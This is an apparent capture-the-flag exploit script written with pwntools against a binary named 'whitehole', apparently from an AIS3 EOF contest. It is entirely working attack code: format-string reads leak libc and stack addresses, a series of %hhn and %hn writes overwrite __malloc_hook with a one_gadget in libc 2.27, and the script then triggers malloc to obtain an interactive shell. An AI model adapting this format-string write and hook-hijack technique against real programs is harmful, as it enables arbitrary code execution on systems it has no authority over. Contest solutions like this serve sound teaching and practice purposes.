#!/usr/bin/python3
from pwn import *

one_gadget = 0xe569f
maxTime = 1.5 - 0.2
count = 0

def send(payload):
    global count
    sleep(0.01)
    log.info('send payload: {}'.format(payload))
    p.sendline(payload)
    count += 1
    
def fmtatk(content, idx, size=1):
    global count
    if size == 1:
        n = b'$hhn'
    elif size == 2:
        n = b'$hn'
    else:
        n = b'$n'

    if content == 0:
        payload = b'%' + str(idx).encode() + n
    else:
        payload = b'%' + str(content).encode() + b'c'
        payload += b'%' + str(idx).encode() + n
    send(payload+b'\0')
    
    sleep(maxTime * content / 255 + 0.2)
    count += 1

def updatePath(rspoffset, path, size=4):
    offset = (rsp + rspoffset) & 0xff
    mask = 0xff
    shift = 0
    
    for i in range(size):
        fmtatk(offset + i, 5)
        fmtatk((path & mask) >> shift, 7)
        
        mask <<= 8
        shift += 8
    
p = process('./whitehole')
# p = remote('eof.ais3.org', 6666)
libc = ELF('./libc-2.27.so')

# leak libc base
send(b'%2$p')
libc.address = int(p.recvline(keepends=False), 16) - 0x110081
one_gadget += libc.address
log.info('libc: {:#x}'.format(libc.address))
log.info('one gadget: {:#x}'.format(one_gadget))
log.info('__malloc_hook: {:#x}'.format(libc.symbols['__malloc_hook']))

# leak stack
send(b'%5$p')
rsp = int(p.recvline(keepends=False), 16) - 0x10
log.info('rsp: {:#x}'.format(rsp))

# rewrite __malloc_hook to one-gadget
updatePath(0x18, libc.symbols['__malloc_hook'], size=8)   # 8
updatePath(0x20, libc.symbols['__malloc_hook']+2, size=8) # 9
updatePath(0x28, libc.symbols['__malloc_hook']+4, size=8) # 10
updatePath(0x30, libc.symbols['__malloc_hook']+6, size=8) # 11

parts = {}
mask = 0xffff
shift = 0
for i in range(4):
    parts[8+i] = (one_gadget & mask) >> shift
    mask <<= 16
    shift += 16

parts = {k: v for k, v in sorted(parts.items(), key=lambda item: item[1])}

prev = 0
payload = b''
for item in parts.items():
    if item[1] - prev == 0:
        payload += b'%' + str(item[0]).encode() + b'$hn'
    else:
        payload += b'%' + str(item[1] - prev).encode() + b'c'
        payload += b'%' + str(item[0]).encode() + b'$hn'
        prev = item[1]
send(payload+b'\0')

log.info('payload count: {}'.format(count))

# Invoke __malloc_hook
p.sendline('LJP')

# Pwned
p.interactive()
